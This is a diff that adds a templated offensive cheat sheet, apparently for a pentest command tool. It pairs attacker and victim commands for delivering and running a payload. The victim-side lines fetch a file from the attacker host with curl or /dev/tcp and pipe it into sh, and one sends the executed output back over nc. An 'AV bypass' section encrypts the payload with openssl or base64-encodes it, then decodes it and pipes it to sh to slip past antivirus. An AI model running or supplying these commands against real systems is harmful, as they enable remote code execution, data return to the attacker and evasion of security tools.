@@ -1,0 +1,44 @@
+--- Transmission & Launch
+
+# desc: Local network (Attacker)
+sudo python -m SimpleHTTPServer #{LPORT}
+
+# desc: Victim
+curl #{LHOST}:#{LPORT}/#{file} | sh
+
+# desc: Without curl (Attacker)
+sudo nc -q 5 -lvnp #{LPORT} < #{file}
+
+# desc: Victim
+cat < /dev/tcp/#{LHOST}/#{LPORT} | sh
+
+# desc: Excute from memory and send output back to the host (Attacker)
+python3 -m http.server #{LPORT} &
+nc -lvnp #{lport_2} | tee #{out_file}
+
+# desc: Victim
+curl #{LHOST}:#{LPORT}/#{file} | sh | nc #{LHOST} #{lport_2}
+
+# desc: output to file
+./#{file} -a > /dev/shm/#{out_file}
+less -r /dev/shm/#{out_file}
+
+@lport_2.desc(Listen port with output)
+
+--- AV bypass
+
+# desc: open-ssl encryption (Attacker)
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in #{file} -out #{enc_file}
+sudo python -m SimpleHTTPServer #{LPORT}
+
+# desc: Victim
+curl #{LHOST}:#{LPORT}/#{enc_file} | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh
+
+# desc: Base64 encoded (Attacker)
+base64 -w0 #{file} > #{enc_file}
+sudo python -m SimpleHTTPServer #{LPORT}
+
+# desc: Victim
+curl #{LHOST}:#{LPORT}/#{enc_file} | base64 -d | sh
+
+@enc_file.desc(Output Encryption File)
